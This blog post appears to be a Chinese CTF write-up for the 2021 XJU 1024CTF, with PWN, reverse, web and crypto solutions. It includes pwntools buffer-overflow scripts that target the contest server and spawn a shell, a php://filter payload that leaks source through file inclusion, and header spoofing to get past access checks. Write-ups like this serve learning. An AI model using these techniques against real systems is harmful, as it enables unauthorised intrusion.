<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021XJU 1024CTF挑战赛Writeup</title>
    <url>/2021/10/25/2021XJU%201024CTF%E6%8C%91%E6%88%98%E8%B5%9BWriteup/</url>
    <content><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><hr>
<h3 id="1-Pwn指北"><a href="#1-Pwn指北" class="headerlink" title="1.Pwn指北"></a>1.Pwn指北</h3><p>下载附件直接拉到最下面即可<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025000814837.png"
                      alt="image-20211025000814837"
                ></p>
<h3 id="2-test-your-nc"><a href="#2-test-your-nc" class="headerlink" title="2.test your nc"></a>2.test your nc</h3><p>直接运行题目所给命令即可夺权-<strong>nc 116.62.221.105 10001</strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025001335768.png"
                      alt="image-20211025001335768"
                ></p>
<h3 id="3-RIP"><a href="#3-RIP" class="headerlink" title="3.RIP"></a>3.RIP</h3><p>下载附件rip,首先判断是多少位的程序:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025214737923.png"
                      alt="image-20211025214737923"
                ><br> 64位,放到IDA64中打开分析,找到main函数,F5反编译:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025215043784.png"
                      alt="image-20211025215043784"
                ></p>
<hr>
<p>程序定义了一个长32的s字符串用以获取用户输入,但是gets()函数无法判断用户输入了多少个字符,发现溢出点. 接下来找用以夺权的函数,在fun中发现了bin&#x2F;sh:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025215426081.png"
                      alt="image-20211025215426081"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025221821849.png"
                      alt="image-20211025221821849"
                ><br> 转到汇编视图,发现程序在数据段中定义了command字符串,内容为”bin&#x2F;sh”,然后再0x4005BF这个地址将command放到了rdi寄存器中, 然后在后面调用了_system函数(call指令),因此溢出操作后写入0x4005BF这个地址就可以夺权了(以上为我的理解,不是很透彻也可能会有错误) 因此构建以下脚本:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>+<span class="number">8</span>)+p64(<span class="number">0x4005BF</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>

<p>执行脚本成功拿到flag<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025221711345.png"
                      alt="image-20211025221711345"
                ></p>
<h3 id="4-level0"><a href="#4-level0" class="headerlink" title="4.level0"></a>4.level0</h3><p>下载附件检查信息,是个64位程序<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025222745285.png"
                      alt="image-20211025222745285"
                ><br> 拖到IDA64中分析找到main函数,F5反编译:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025223107306.png"
                      alt="image-20211025223107306"
                ><br> 双击进入函数:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025223210470.png"
                      alt="image-20211025223210470"
                ><br> 发现buf长度为128,read()函数允许我们输入0x200个长度的数据,比128大,可以进行溢出操作,然后找夺权函数:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025223934774.png"
                      alt="image-20211025223934774"
                ><br> 分析同上题一样,构建脚本:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10003</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">128</span>+<span class="number">8</span>)+p64(<span class="number">0x4011AA</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224140038.png"
                      alt="image-20211025224140038"
                ><br> 得到flag</p>
<h3 id="5-Guess-number"><a href="#5-Guess-number" class="headerlink" title="5.Guess number"></a>5.Guess number</h3><p>下载附件,分析为64位<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224340577.png"
                      alt="image-20211025224340577"
                ><br> 拖到IDA64,分析:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224510616.png"
                      alt="image-20211025224510616"
                ><br> 双击打开func():<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224601703.png"
                      alt="image-20211025224601703"
                ><br> 发现只要有一个长度为56的v1字符串和一个浮点数v2,而且当v2&#x3D;11.28125,就可以拿到flag,但是发现我们输入的是v1,无法输入v2,继续分析:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224816420.png"
                      alt="image-20211025224816420"
                ><br> 发现v1字符串的地址在-0x40,v2浮点数在-0x08的位置,我们可以将-0x40到-0x08全填满然后将11.28215赋给v2. 这里我们还需要将11.28215转换为16进制:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025225507436.png"
                      alt="image-20211025225507436"
                ><br> 在汇编视图,ucomiss比较指令后双击进入后面的数据可以找到11.28215的16进制表示:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025225745186.png"
                      alt="image-20211025225745186"
                ><br> 构造以下python脚本:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10004</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x8</span>)+p64(<span class="number">0x41348000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025225834268.png"
                      alt="image-20211025225834268"
                ></p>
<hr>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><hr>
<h3 id="1-re签到"><a href="#1-re签到" class="headerlink" title="1.re签到"></a>1.re签到</h3><p>下载文件后解压得到<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025002846509.png"
                      alt="image-20211025002846509"
                ><br> 然后将其拖入到IDA中并且根据提示按Shift+F12得到如下视图,然后可在其中找到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003021216.png"
                      alt="image-20211025003021216"
                ></p>
<h3 id="2-game-switch"><a href="#2-game-switch" class="headerlink" title="2.game switch"></a>2.game switch</h3><p>下载附件得到<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003204918.png"
                      alt="image-20211025003204918"
                ><br> 先直接运行<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003241691.png"
                      alt="image-20211025003241691"
                ><br> 让输入0-8其中一个数(0为重启游戏),数据量不大直接先从1试到8,试到8时出现flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003453306.png"
                      alt="image-20211025003453306"
                ></p>
<h3 id="3-再用IDA签一次到"><a href="#3-再用IDA签一次到" class="headerlink" title="3.再用IDA签一次到"></a>3.再用IDA签一次到</h3><p>下载得到2.exe文件,直接拖入IDA分析,找到main函数,F5反编译:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003726712.png"
                      alt="image-20211025003726712"
                ><br> 双击进入check_flag()函数,得到如下代码:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">int64 __fastcall <span class="title function_">check_flag</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 != <span class="number">120</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">106</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">117</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">123</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">unsigned</span> __int8)a1[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)result == <span class="number">66</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">unsigned</span> __int8)a1[<span class="number">5</span>];</span><br><span class="line">          <span class="keyword">if</span> ( (_BYTE)result == <span class="number">105</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (<span class="type">unsigned</span> __int8)a1[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">if</span> ( (_BYTE)result == <span class="number">110</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (<span class="type">unsigned</span> __int8)a1[<span class="number">7</span>];</span><br><span class="line">              <span class="keyword">if</span> ( (_BYTE)result == <span class="number">97</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)a1[<span class="number">8</span>];</span><br><span class="line">                <span class="keyword">if</span> ( (_BYTE)result == <span class="number">114</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">9</span>];</span><br><span class="line">                  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">121</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">10</span>];</span><br><span class="line">                    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">95</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">11</span>];</span><br><span class="line">                      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">83</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        result = (<span class="type">unsigned</span> __int8)a1[<span class="number">12</span>];</span><br><span class="line">                        <span class="keyword">if</span> ( (_BYTE)result == <span class="number">116</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          result = (<span class="type">unsigned</span> __int8)a1[<span class="number">13</span>];</span><br><span class="line">                          <span class="keyword">if</span> ( (_BYTE)result == <span class="number">97</span> )</span><br><span class="line">                          &#123;</span><br><span class="line">                            result = (<span class="type">unsigned</span> __int8)a1[<span class="number">14</span>];</span><br><span class="line">                            <span class="keyword">if</span> ( (_BYTE)result == <span class="number">110</span> )</span><br><span class="line">                            &#123;</span><br><span class="line">                              result = (<span class="type">unsigned</span> __int8)a1[<span class="number">15</span>];</span><br><span class="line">                              <span class="keyword">if</span> ( (_BYTE)result == <span class="number">100</span> )</span><br><span class="line">                              &#123;</span><br><span class="line">                                result = (<span class="type">unsigned</span> __int8)a1[<span class="number">16</span>];</span><br><span class="line">                                <span class="keyword">if</span> ( (_BYTE)result == <span class="number">95</span> )</span><br><span class="line">                                &#123;</span><br><span class="line">                                  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">17</span>];</span><br><span class="line">                                  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">85</span> )</span><br><span class="line">                                  &#123;</span><br><span class="line">                                    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">18</span>];</span><br><span class="line">                                    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">112</span> )</span><br><span class="line">                                    &#123;</span><br><span class="line">                                      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">19</span>];</span><br><span class="line">                                      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">125</span> )</span><br><span class="line">                                      &#123;</span><br><span class="line">                                        <span class="built_in">printf</span>(<span class="string">&quot;yes,this is a flag&quot;</span>);</span><br><span class="line">                                        getchar();</span><br><span class="line">                                        result = <span class="number">0</span>i64;</span><br><span class="line">                                      &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                  &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                              &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>经过分析可得程序将输入的v2字符串传到check_flag()函数的a1中,然后将a1[1]-a1[19]中的字符与一个ASCII码进行对比,若全部相等则输出yes,this is a flag. 因此判断将所有ASCII码转为字符连起来即可得到flag,实际中会得到 ju{xxxxxx},根据flag格式前面应该缺一个 x ,补上即为正确flag</p>
<h3 id="4-Nizdy不喜欢玩游戏"><a href="#4-Nizdy不喜欢玩游戏" class="headerlink" title="4.Nizdy不喜欢玩游戏"></a>4.Nizdy不喜欢玩游戏</h3><p>下载文件FlappyflappyBird.exe,拖入IDA分析,找到main函数,F5反编译:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025004946233.png"
                      alt="image-20211025004946233"
                ><br> 题目说是玩到2021分就有flag,发现当score&gt;2020时会输出real[0]和src,双击这俩变量进入汇编视图查看变量内容,如图:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025005217219.png"
                      alt="image-20211025005217219"
                ><br> 可以很快发现src的内容与flag形式很像,猜测为凯撒密码,将其复制到凯撒密码解密器中枚举,得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025005433577.png"
                      alt="image-20211025005433577"
                ></p>
<h3 id="5-easyre"><a href="#5-easyre" class="headerlink" title="5.easyre"></a>5.easyre</h3><p>下载解压得到easyre.txt,打开发现是c语言,简单分析一下:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025005923226.png"
                      alt="image-20211025005923226"
                ><br> 程序首先读入一个长度为21的<code>input</code>字符串,然后将input中的每个字符ASCII码减5,之后在与<code>&quot;SEPN@&gt;vR@G&gt;JH@ZOJZPNx&quot;</code>字符串进行比较,相同则输出<code>lucky!flag is your input</code>,于是编写c++语言脚本如下获得flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025010919597.png"
                      alt="image-20211025010919597"
                ></p>
<hr>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><hr>
<h3 id="1-robots"><a href="#1-robots" class="headerlink" title="1.robots"></a>1.robots</h3><p>打开题目链接直接访问robots.txt文件:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011104880.png"
                      alt="image-20211025011104880"
                ><br> 根据robots内内容访问flaaaggg.php拿到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011146021.png"
                      alt="image-20211025011146021"
                ></p>
<h3 id="2-where-is-f1ag"><a href="#2-where-is-f1ag" class="headerlink" title="2.where is f1ag?"></a>2.where is f1ag?</h3><p>打开题目链接发现只有<code>FLAG is not here</code>,F12审查元素看看有没有什么提示:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011328003.png"
                      alt="image-20211025011328003"
                ><br> 发现<code>flag in web.pdf</code>,访问web.pdf在最下面发现flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011432030.png"
                      alt="image-20211025011432030"
                ></p>
<h3 id="3-cookie"><a href="#3-cookie" class="headerlink" title="3.cookie"></a>3.cookie</h3><p>打开链接,根据题目提示直接F12查看cookie:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025011532460.png"
                      alt="image-20211025011532460"
                ><br> 发现URL编码过的flag,解码得到<code>XJUSEC&#123;you_find_C00kie!&#125;</code></p>
<h3 id="4-get-post"><a href="#4-get-post" class="headerlink" title="4.get&amp;post"></a>4.get&amp;post</h3><p>打开题目链接发现以下PHP代码:</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xju&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;xjusec&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xju&#x27;</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;xjusec&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$a</span> === <span class="string">&#x27;welcome&#x27;</span> &amp;&amp; <span class="variable">$b</span> === <span class="string">&#x27;xju&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Do you know get&amp;post?&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>简单分析可知服务器接收到一个<code>xju=welcome</code>的GET请求和<code>xjusec=xju</code>的POST请求即会执行<code>echo $flag</code>语句,按条件发送后得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025012219767.png"
                      alt="image-20211025012219767"
                ></p>
<h3 id="5-绯红之王"><a href="#5-绯红之王" class="headerlink" title="5.绯红之王"></a>5.绯红之王</h3><p>打开题目链接发现有个名为<code>give me flag</code>访问地址为<code>/flag.php</code>的超级链接,点击后跳转到百度,猜测网页进行了重定向,flag就在flag.php中,于是利用linux下curl命令默认不跟随重定向的特点访问flag.php得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025012627955.png"
                      alt="image-20211025012627955"
                ></p>
<h3 id="6-伪协议"><a href="#6-伪协议" class="headerlink" title="6.伪协议"></a>6.伪协议</h3><p>打开题目链接得到如下代码:</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;Happy 1024&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$b</span>);  <span class="comment">//flag.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>简单分析代码,当<code>file_get_contents($a,&#39;r&#39;)</code>的值等于<code>&quot;Happy 1024&quot;</code>时可以执行<code>include($b)</code>语句,flag在flag.php文件中 首先访问flag.php:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025015138723.png"
                      alt="image-20211025015138723"
                ><br> 发现获取不了flag,根据题目提示,该题需要使用伪协议,首先试着访问phpinfo看看可以使用哪些伪协议,发现找不到phpinfo文件(可能是我没找到),于是我先试了试php:&#x2F;&#x2F;input伪协议进行传入<code>&quot;Happy 1024&quot;</code>使file_get_contents($a,’r’)得到的值为<code>Happy 1024</code>,如图:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025014223111.png"
                      alt="image-20211025014223111"
                ><br> 服务器返回<code>Warning: include(): Filename cannot be empty in /var/www/html/index.php</code>错误,意思是include()函数内容不能为空,这就意味着成功执行了<code>include($b)</code>语句,因为没有传b的值而报错. 也说明php:&#x2F;&#x2F;伪协议是可以用的.接下来来传b的值通过伪协议访问flag.php. 这里使用php:&#x2F;&#x2F;filter伪协议中的read,因为要得到<strong>php文件</strong>的源码,我们要对其进行base64编码,即<code>php://filter/read=convert.base64-encode/resource=flag.php</code>得到一串base64编码的字符串:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025015702488.png"
                      alt="image-20211025015702488"
                ><br> 对其解码得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025015757220.png"
                      alt="image-20211025015757220"
                ></p>
<h3 id="7-Do-you-know-http"><a href="#7-Do-you-know-http" class="headerlink" title="7.Do you know http?"></a>7.Do you know http?</h3><p>打开题目链接得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025015902356.png"
                      alt="image-20211025015902356"
                ><br> 于是使用burpsuite发送一个请求方法为<code>Ethe</code>的请求:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025020027910.png"
                      alt="image-20211025020027910"
                ><br> 提示”只有本地登陆才可以哦！”,然后加入X-Forwarded-For请求头,值为<code>127.0.0.1</code>:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025020244644.png"
                      alt="image-20211025020244644"
                ><br> 又提示”只有从<code>www.xjusec.com</code>过来的人才能看到下一步哦！”,加入Referer请求头,值为<code>www.xjusec.com</code> :<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025020511386.png"
                      alt="image-20211025020511386"
                ><br> 又**提示”你为什么不用’xju’这个官方浏览器！！” ,把User-Agent请求头的值改为xju得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025020612135.png"
                      alt="image-20211025020612135"
                ><br> 终于拿到了flag!!!!</p>
<hr>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><hr>
<h3 id="1-Crypto指南"><a href="#1-Crypto指南" class="headerlink" title="1.Crypto指南"></a>1.Crypto指南</h3><p>下载附件CRYPTO.pdf,拉到最下面得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025153716169.png"
                      alt="image-20211025153716169"
                ></p>
<h3 id="2-社会主义核心阿弥陀佛"><a href="#2-社会主义核心阿弥陀佛" class="headerlink" title="2.社会主义核心阿弥陀佛"></a>2.社会主义核心阿弥陀佛</h3><p>下载附件得到一个txt文件,里面内容为:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">诚信自由自由友善平等友善法治敬业友善平等友善爱国公正敬业友善平等诚信民主富强友善爱国诚信平等诚信民主友善公正敬业诚信富强友善爱国公正友善平等文明敬业敬业诚信自由平等友善平等友善法治爱国诚信文明友善爱国平等敬业和谐爱国公正诚信自由爱国爱国富强友善平等公正友善爱国法治友善平等友善法治友善平等富强友善爱国公正敬业敬业友善平等友善自由诚信自由公正爱国和谐诚信民主和谐友善爱国平等敬业富强爱国敬业诚信自由平等敬业和谐爱国公正友善爱国法治诚信富强自由敬业敬业友善爱国公正爱国和谐友善平等和谐友善爱国公正友善自由文明友善平等平等友善爱国公正诚信民主友善公正友善自由友善平等友善爱国平等敬业民主敬业富强友善爱国平等友善自由自由友善平等法治友善爱国公正敬业诚信民主诚信民主富强友善爱国法治敬业诚信富强友善自由自由诚信自由敬业爱国和谐诚信民主友善法治友善爱国爱国诚信富强爱国诚信民主公正诚信自由公正爱国富强诚信富强友善敬业友善爱国平等诚信民主友善爱国敬业法治友善爱国和谐爱国富强爱国文明诚信自由自由友善平等诚信自由爱国自由诚信自由自由友善平等诚信民主友善自由平等友善爱国公正爱国富强友善自由诚信平等友善爱国公正爱国富强敬业公正友善爱国自由诚信民主诚信平等诚信民主民主诚信自由公正敬业敬业友善平等诚信富强友善爱国公正爱国敬业爱国富强诚信自由平等爱国公正诚信富强平等诚信自由平等爱国诚信民主敬业诚信和谐友善爱国自由诚信民主友善爱国爱国自由友善爱国平等友善自由诚信平等诚信富强友善平等友善爱国公正爱国富强诚信富强诚信平等诚信自由公正敬业民主友善自由敬业友善爱国法治友善自由平等敬业诚信自由诚信自由自由友善平等诚信平等诚信民主民主诚信自由平等敬业文明敬业文明友善爱国法治敬业友善自由诚信富强自由友善爱国公正诚信民主诚信文明诚信富强友善平等诚信自由公正友善平等和谐友善自由文明友善爱国法治爱国自由友善自由民主诚信自由平等诚信富强自由诚信富强法治友善爱国公正爱国和谐诚信民主和谐诚信自由公正敬业平等友善平等爱国友善爱国公正友善平等公正爱国平等诚信自由平等敬业民主敬业富强友善爱国敬业爱国文明友善自由和谐友善爱国法治友善自由友善平等敬业诚信平等诚信自由公正诚信富强文明诚信民主平等诚信自由自由友善平等诚信民主诚信富强平等诚信自由爱国爱国爱国友善自由友善公正诚信自由平等诚信民主爱国敬业诚信和谐诚信自由法治诚信民主友善法治诚信民主富强诚信自由爱国敬业爱国爱国法治友善爱国公正友善自由友善法治友善平等友善平等诚信自由公正友善自由文明诚信民主平等诚信自由法治友善平等友善爱国友善自由友善敬业友善爱国法治友善平等诚信和谐友善平等富强友善爱国敬业爱国公正诚信富强诚信平等友善爱国平等敬业民主敬业富强诚信自由自由诚信民主诚信自由敬业友善法治诚信自由法治友善平等诚信和谐诚信民主富强诚信自由平等爱国友善敬业爱国和谐诚信自由平等诚信富强平等友善自由文明诚信自由法治友善自由平等敬业友善爱国友善爱国平等友善平等诚信自由敬业法治诚信自由爱国友善自由爱国友善平等公正诚信自由公正爱国富强友善自由诚信平等诚信自由敬业敬业敬业诚信富强自由诚信自由平等友善自由平等诚信富强文明诚信自由平等友善自由敬业爱国公正友善爱国平等友善自由诚信自由诚信富强自由 </span><br></pre></td></tr></table></figure></div>

<p>以前在网上瞎看的时候看到一个”核心价值观编码”,于是拿上去解码得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154235376.png"
                      alt="image-20211025154235376"
                ><br> 根据题目提示和密文格式,判断是”与佛论禅”,拿上去解码得flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154329740.png"
                      alt="image-20211025154329740"
                ></p>
<h3 id="3-爱弹贝斯的Caesar"><a href="#3-爱弹贝斯的Caesar" class="headerlink" title="3.爱弹贝斯的Caesar"></a>3.爱弹贝斯的Caesar</h3><p>下载附件得到一个txt文件,内容为<code>S1dIRlJQezd1cl8yYWZqUmVfMWZfdW5lcV82Yl9ndTFheF8wNX0=</code> 根据题目”贝斯”和密文内容,猜测为base64编码,解码得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154542804.png"
                      alt="image-20211025154542804"
                ><br> 发现又为一串密文,观察格式判断可能为凯撒密码,用工具枚举得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154725298.png"
                      alt="image-20211025154725298"
                ></p>
